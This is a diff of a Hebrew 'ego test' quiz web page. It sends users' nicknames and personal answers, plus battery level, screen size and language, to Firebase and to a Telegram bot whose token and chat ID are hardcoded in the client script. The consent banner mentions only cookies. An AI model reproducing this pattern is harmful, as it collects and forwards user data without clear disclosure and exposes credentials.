@@ -22,6 +22,7 @@
             justify-content: center;
             margin: 0;
             padding: 20px;
+            overflow-x: hidden;
         }
         .glass-panel {
             background: var(--glass);
@@ -34,8 +35,8 @@
             box-shadow: 0 8px 32px rgba(0,0,0,0.2);
             text-align: center;
         }
-        .hidden { display: none; }
-        input, select {
+        .hidden { display: none !important; }
+        input {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
@@ -43,8 +44,10 @@
             border: none;
             background: rgba(255,255,255,0.2);
             color: white;
+            font-size: 1rem;
+            outline: none;
         }
-        option { color: black; }
+        input::placeholder { color: rgba(255,255,255,0.7); }
         .btn {
             width: 100%;
             padding: 15px;
@@ -54,33 +57,29 @@
             background: #fff;
             color: var(--primary);
             font-weight: bold;
+            font-size: 1.1rem;
             cursor: pointer;
             transition: 0.3s;
         }
-        .btn:hover { opacity: 0.9; transform: scale(1.02); }
-        #cookie-banner {
-            position: fixed;
-            bottom: 20px;
-            width: 90%;
-            z-index: 999;
-        }
-        footer { margin-top: 20px; font-size: 0.8rem; }
-        a { color: #fff; text-decoration: none; font-weight: bold; }
+        .btn:hover { background: #f0f0f0; transform: translateY(-2px); }
+        #cookie-banner { position: fixed; bottom: 20px; width: 90%; z-index: 999; }
+        footer { margin-top: 25px; font-size: 0.9rem; opacity: 0.8; }
+        a { color: #fff; text-decoration: none; font-weight: bold; border-bottom: 1px solid #fff; }
     </style>
 </head>
 <body>
 
     <div id="cookie-banner" class="glass-panel">
-        <p>אנו משתמשים בעוגיות לשיפור החוויה. האם אתה מאשר?</p>
-        <button id="btn-accept" class="btn">אישור והמשך</button>
+        <p>אנו משתמשים בעוגיות כדי לשפר את החוויה שלך במערכת. האם אתה מאשר?</p>
+        <button id="btn-accept" class="btn">אישור והמשך למבחן</button>
     </div>
 
     <main id="app" class="glass-panel hidden">
         <div id="step-1">
-            <h1>ברוכים הבאים למבחן האגו</h1>
-            <p>הכנס כינוי כדי להתחיל:</p>
-            <input type="text" id="nickname" placeholder="הכינוי שלך...">
-            <button id="btn-to-quiz" class="btn">המשך לשאלות</button>
+            <h1>מבחן האגו 🔥</h1>
+            <p>גלה כמה החברים שלך באמת מכירים אותך!</p>
+            <input type="text" id="nickname" placeholder="הכנס כינוי..." autocomplete="off">
+            <button id="btn-to-quiz" class="btn">התחל ליצור שאלות</button>
         </div>
 
         <div id="step-2" class="hidden">
@@ -95,14 +94,15 @@
             <p>3. מה החלום הכי גדול שלך?</p>
             <input type="text" id="q3" placeholder="תשובה 3...">
 
-            <button id="btn-finish" class="btn">צור מבחן ושלח דיווח</button>
+            <button id="btn-finish" class="btn">צור קישור ושלח דיווח</button>
         </div>
 
         <div id="step-3" class="hidden">
-            <h2>המבחן מוכן!</h2>
-            <p>שתף את הקישור עם חברים:</p>
-            <input type="text" id="share-url" readonly>
-            <button id="btn-copy" class="btn">העתק קישור</button>
+            <h2 style="color: #4ade80;">המבחן נוצר בהצלחה! ✅</h2>
+            <p>שלח את הקישור לחברים ובדוק את התוצאות:</p>
+            <input type="text" id="share-url" readonly style="background: rgba(0,0,0,0.3); color: #4ade80;">
+            <button id="btn-copy" class="btn">העתק קישור ללוח</button>
+            <p style="font-size: 0.8rem; margin-top: 15px;">הדיווח נשלח למערכת הניהול.</p>
         </div>
     </main>
 
@@ -123,57 +123,56 @@
             appId: "1:230666122567:web:ce69416816347597c2c862"
         };
 
-        const tgConfig = {
-            token: "8622383760:AAFiBI0n7zpNSqQIF2mosuQXuHi_XUVjopE",
-            chatId: "7089165458"
-        };
+        const tgToken = "8622383760:AAFiBI0n7zpNSqQIF2mosuQXuHi_XUVjopE";
+        const tgChatId = "7089165458";
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- Functions ---
-        async function sendToTelegram(data) {
-            const message = `
-<b>🔔 דיווח משתמש חדש - Ego Test</b>
-<b>כינוי:</b> ${data.nickname}
-<b>ID:</b> ${data.uuid}
-<b>תשובה 1:</b> ${data.q1}
-<b>תשובה 2:</b> ${data.q2}
-<b>תשובה 3:</b> ${data.q3}
------------------------
+        // --- Core Functions ---
+        async function sendTelegramReport(data) {
+            const text = `
+<b>🚀 משתמש חדש יצר מבחן!</b>
+<b>👤 כינוי:</b> ${data.nickname}
+<b>🆔 מזהה:</b> <code>${data.uuid}</code>
+
+<b>❓ תשובות:</b>
+1. ${data.q1}
+2. ${data.q2}
+3. ${data.q3}
+
+<b>📱 מידע טכני:</b>
 <b>סוללה:</b> ${data.battery}%
-<b>שפה:</b> ${data.lang}
 <b>רזולוציה:</b> ${data.screen}
+<b>שפה:</b> ${data.lang}
             `;
 
-            await fetch(`https://api.telegram.org/bot${tgConfig.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: tgConfig.chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
+            try {
+                await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: tgChatId,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) { console.error("TG Error:", e); }
         }
 
-        async function getDeviceData() {
-            let batteryLevel = "N/A";
-            try {
-                const battery = await navigator.getBattery();
-                batteryLevel = Math.round(battery.level * 100);
-            } catch (e) {}
-
+        async function getStats() {
+            let bat = "N/A";
+            try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100); } catch(e){}
             return {
+                battery: bat,
                 lang: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                battery: batteryLevel
+                screen: `${window.screen.width}x${window.screen.height}`
             };
         }
 
-        // --- UI Logic ---
+        // --- Logic ---
         const uuid = crypto.randomUUID();
-        
+
         document.getElementById('btn-accept').onclick = () => {
             localStorage.setItem('ego_consent', 'true');
             document.getElementById('cookie-banner').classList.add('hidden');
@@ -181,7 +180,7 @@
         };
 
         document.getElementById('btn-to-quiz').onclick = () => {
-            if(!document.getElementById('nickname').value) return alert("הכנס כינוי");
+            if(!document.getElementById('nickname').value) return alert("בבקשה הכנס כינוי");
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.remove('hidden');
         };
@@ -191,34 +190,37 @@
             const q1 = document.getElementById('q1').value;
             const q2 = document.getElementById('q2').value;
             const q3 = document.getElementById('q3').value;
-            
-            const device = await getDeviceData();
 
-            const payload = {
-                uuid, nickname, q1, q2, q3, ...device,
-                timestamp: new Date().toISOString()
-            };
+            if(!q1 || !q2 || !q3) return alert("אנא ענה על כל השאלות");
 
-            // Save to Firebase
-            const docRef = await addDoc(collection(db, "quizzes"), payload);
-            
-            // Send to Telegram
-            await sendToTelegram(payload);
+            const btn = document.getElementById('btn-finish');
+            btn.textContent = "שולח נתונים...";
+            btn.disabled = true;
 
-            // Show Share UI
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-3').classList.remove('hidden');
-            document.getElementById('share-url').value = `${window.location.href}?id=${docRef.id}`;
+            const stats = await getStats();
+            const payload = { uuid, nickname, q1, q2, q3, ...stats, date: new Date().toISOString() };
+
+            try {
+                const docRef = await addDoc(collection(db, "quizzes"), payload);
+                await sendTelegramReport(payload);
+                
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-3').classList.remove('hidden');
+                document.getElementById('share-url').value = `${window.location.href.split('?')[0]}?id=${docRef.id}`;
+            } catch (e) {
+                alert("שגיאה בחיבור ל-Firebase. וודא שהגדרת הרשאות ב-Console.");
+                btn.textContent = "נסה שוב";
+                btn.disabled = false;
+            }
         };
 
         document.getElementById('btn-copy').onclick = () => {
-            const copyText = document.getElementById('share-url');
-            copyText.select();
-            document.execCommand("copy");
+            const el = document.getElementById('share-url');
+            el.select();
+            document.execCommand('copy');
             alert("הקישור הועתק!");
         };
 
-        // Check for existing consent
         if(localStorage.getItem('ego_consent')) {
             document.getElementById('cookie-banner').classList.add('hidden');
             document.getElementById('app').classList.remove('hidden');
@@ -226,4 +228,3 @@
     </script>
 </body>
 </html>
-
